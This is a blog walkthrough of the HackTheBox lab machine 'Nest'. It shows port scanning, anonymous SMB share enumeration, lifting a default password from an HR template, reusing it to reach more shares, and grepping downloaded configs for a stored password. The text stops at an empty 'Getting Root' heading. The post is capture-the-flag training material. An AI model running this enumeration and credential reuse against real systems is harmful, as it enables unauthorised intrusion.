---
layout: post
title: Hackthebox Nest Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-10/nest.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Nest`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.178 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-07 11:41 JST
Nmap scan report for 10.10.10.178
Host is up (0.24s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     Reporting Service V1.2
|     Unrecognised command
|   Help:
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.80%I=7%D=7/7%Time=5F03E218%P=x86_64-pc-linux-gnu%r(NUL
SF:L,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLine
SF:s,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised
SF:\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comman
SF:d\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n
SF:\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repor
SF:ting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"\
SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\x
SF:20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20the
SF:\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---\
SF:r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\n
SF:DEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCookie
SF:,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionRe
SF:q,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,21
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20c
SF:ommand\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20Re
SF:porting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>");

Host script results:
|_clock-skew: 3m26s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-07-07T02:52:57
|_  start_date: 2020-07-07T02:35:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 488.39 seconds
```

### SMB enumeration
```shell
root@kali:~# smbmap -H 10.10.10.178 -u null
[+] Guest session   	IP: 10.10.10.178:445	Name: 10.10.10.178
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY
	IPC$                                              	NO ACCESS	Remote IPC
	Secure$                                           	NO ACCESS
	Users                                             	READ ONLY
```


## 2. Getting User

We have 2 directories we have access.<br>
`Users` has nothing interesting but `Data` has some text files.
```shell
root@kali:~# smbmap -H 10.10.10.178 -u null -R Data
[+] Guest session   	IP: 10.10.10.178:445	Name: 10.10.10.178                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Data                                              	READ ONLY	
	.\Data\*
	dr--r--r--                0 Thu Aug  8 07:53:46 2019	.
	dr--r--r--                0 Thu Aug  8 07:53:46 2019	..
	dr--r--r--                0 Thu Aug  8 07:58:07 2019	IT
	dr--r--r--                0 Tue Aug  6 06:53:41 2019	Production
	dr--r--r--                0 Tue Aug  6 06:53:50 2019	Reports
	dr--r--r--                0 Thu Aug  8 04:07:51 2019	Shared
	.\Data\Shared\*
	dr--r--r--                0 Thu Aug  8 04:07:51 2019	.
	dr--r--r--                0 Thu Aug  8 04:07:51 2019	..
	dr--r--r--                0 Thu Aug  8 04:07:33 2019	Maintenance
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	Templates
	.\Data\Shared\Maintenance\*
	dr--r--r--                0 Thu Aug  8 04:07:33 2019	.
	dr--r--r--                0 Thu Aug  8 04:07:33 2019	..
	fr--r--r--               48 Thu Aug  8 04:07:32 2019	Maintenance Alerts.txt
	.\Data\Shared\Templates\*
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	.
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	..
	dr--r--r--                0 Thu Aug  8 04:08:10 2019	HR
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	Marketing
	.\Data\Shared\Templates\HR\*
	dr--r--r--                0 Thu Aug  8 04:08:10 2019	.
	dr--r--r--                0 Thu Aug  8 04:08:10 2019	..
	fr--r--r--              425 Thu Aug  8 07:55:36 2019	Welcome Email.txt
```

```shell
root@kali:~# smbclient //10.10.10.178/Data
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> get "\Shared\Templates\HR\Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as \Shared\Templates\HR\Welcome Email.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
```shell
root@kali:~# cat '\Shared\Templates\HR\Welcome Email.txt' 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

```shell
root@kali:~# smbmap -u Tempuser -p welcome2019 -H 10.10.10.178
[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	Secure$                                           	READ ONLY	
	Users                                             	READ ONLY	
```

```shell
root@kali:~# smbmap -u Tempuser -p welcome2019 -H 10.10.10.178 -R Secure$
[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Secure$                                           	READ ONLY	
	.\Secure$\*
	dr--r--r--                0 Thu Aug  8 08:08:12 2019	.
	dr--r--r--                0 Thu Aug  8 08:08:12 2019	..
	dr--r--r--                0 Thu Aug  8 04:40:25 2019	Finance
	dr--r--r--                0 Thu Aug  8 08:08:12 2019	HR
	dr--r--r--                0 Thu Aug  8 19:59:25 2019	IT
```

```shell
root@kali:~# smbmap -u Tempuser -p welcome2019 -H 10.10.10.178 -R Data
[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Data                                              	READ ONLY	
	.\Data\*
	dr--r--r--                0 Thu Aug  8 07:53:46 2019	.
	dr--r--r--                0 Thu Aug  8 07:53:46 2019	..
	dr--r--r--                0 Thu Aug  8 07:58:07 2019	IT
	dr--r--r--                0 Tue Aug  6 06:53:41 2019	Production
	dr--r--r--                0 Tue Aug  6 06:53:50 2019	Reports
	dr--r--r--                0 Thu Aug  8 04:07:51 2019	Shared
	.\Data\IT\*
	dr--r--r--                0 Thu Aug  8 07:58:07 2019	.
	dr--r--r--                0 Thu Aug  8 07:58:07 2019	..
	dr--r--r--                0 Thu Aug  8 07:58:07 2019	Archive
	dr--r--r--                0 Thu Aug  8 07:59:34 2019	Configs
	dr--r--r--                0 Thu Aug  8 07:08:30 2019	Installs
	dr--r--r--                0 Sun Jan 26 09:09:13 2020	Reports
	dr--r--r--                0 Tue Aug  6 07:33:51 2019	Tools
	.\Data\IT\Configs\*
	dr--r--r--                0 Thu Aug  8 07:59:34 2019	.
	dr--r--r--                0 Thu Aug  8 07:59:34 2019	..
	dr--r--r--                0 Thu Aug  8 04:20:13 2019	Adobe
	dr--r--r--                0 Tue Aug  6 20:16:34 2019	Atlas
	dr--r--r--                0 Tue Aug  6 22:27:08 2019	DLink
	dr--r--r--                0 Thu Aug  8 04:23:26 2019	Microsoft
	dr--r--r--                0 Thu Aug  8 04:33:54 2019	NotepadPlusPlus
	dr--r--r--                0 Thu Aug  8 05:01:13 2019	RU Scanner
	dr--r--r--                0 Tue Aug  6 22:27:09 2019	Server Manager
	.\Data\IT\Configs\Adobe\*
	dr--r--r--                0 Thu Aug  8 04:20:13 2019	.
	dr--r--r--                0 Thu Aug  8 04:20:13 2019	..
	fr--r--r--              246 Thu Aug  8 04:20:13 2019	editing.xml
	fr--r--r--                0 Thu Aug  8 04:20:09 2019	Options.txt
	fr--r--r--              258 Thu Aug  8 04:20:09 2019	projects.xml
	fr--r--r--             1274 Thu Aug  8 04:20:09 2019	settings.xml
	.\Data\IT\Configs\Atlas\*
	dr--r--r--                0 Tue Aug  6 20:16:34 2019	.
	dr--r--r--                0 Tue Aug  6 20:16:34 2019	..
	fr--r--r--             1369 Tue Aug  6 20:18:38 2019	Temp.XML
	.\Data\IT\Configs\Microsoft\*
	dr--r--r--                0 Thu Aug  8 04:23:26 2019	.
	dr--r--r--                0 Thu Aug  8 04:23:26 2019	..
	fr--r--r--             4598 Thu Aug  8 04:23:26 2019	Options.xml
	.\Data\IT\Configs\NotepadPlusPlus\*
	dr--r--r--                0 Thu Aug  8 04:33:54 2019	.
	dr--r--r--                0 Thu Aug  8 04:33:54 2019	..
	fr--r--r--             6451 Thu Aug  8 08:01:25 2019	config.xml
	fr--r--r--             2108 Thu Aug  8 08:00:36 2019	shortcuts.xml
	.\Data\IT\Configs\RU Scanner\*
	dr--r--r--                0 Thu Aug  8 05:01:13 2019	.
	dr--r--r--                0 Thu Aug  8 05:01:13 2019	..
	fr--r--r--              270 Fri Aug  9 04:49:37 2019	RU_config.xml
	.\Data\Shared\*
	dr--r--r--                0 Thu Aug  8 04:07:51 2019	.
	dr--r--r--                0 Thu Aug  8 04:07:51 2019	..
	dr--r--r--                0 Thu Aug  8 04:07:33 2019	Maintenance
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	Templates
	.\Data\Shared\Maintenance\*
	dr--r--r--                0 Thu Aug  8 04:07:33 2019	.
	dr--r--r--                0 Thu Aug  8 04:07:33 2019	..
	fr--r--r--               48 Thu Aug  8 04:07:32 2019	Maintenance Alerts.txt
	.\Data\Shared\Templates\*
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	.
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	..
	dr--r--r--                0 Thu Aug  8 04:08:10 2019	HR
	dr--r--r--                0 Thu Aug  8 04:08:07 2019	Marketing
	.\Data\Shared\Templates\HR\*
	dr--r--r--                0 Thu Aug  8 04:08:10 2019	.
	dr--r--r--                0 Thu Aug  8 04:08:10 2019	..
	fr--r--r--              425 Thu Aug  8 07:55:36 2019	Welcome Email.txt
```

We can download these all xml files with the following command.
```shell
root@kali:~# smbmap -u Tempuser -p welcome2019 -H 10.10.10.178 -R Data -A xml
[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
[+] Starting search for files matching 'xml' on share Data.
[+] Match found! Downloading: Data\IT\Configs\Adobe\editing.xml
[+] Match found! Downloading: Data\IT\Configs\Adobe\projects.xml
[+] Match found! Downloading: Data\IT\Configs\Adobe\settings.xml
[+] Match found! Downloading: Data\IT\Configs\Atlas\Temp.XML
[+] Match found! Downloading: Data\IT\Configs\Microsoft\Options.xml
[+] Match found! Downloading: Data\IT\Configs\NotepadPlusPlus\config.xml
[+] Match found! Downloading: Data\IT\Configs\NotepadPlusPlus\shortcuts.xml
[+] Match found! Downloading: Data\IT\Configs\RU Scanner\RU_config.xml
```

```shell
root@kali:~# grep -i password *.xml
10.10.10.178-Data_IT_Configs_RU Scanner_RU_config.xml:  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
```

```shell
root@kali:~# cat 10.10.10.178-Data_IT_Configs_RU\ Scanner_RU_config.xml 
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```

## 3. Getting Root

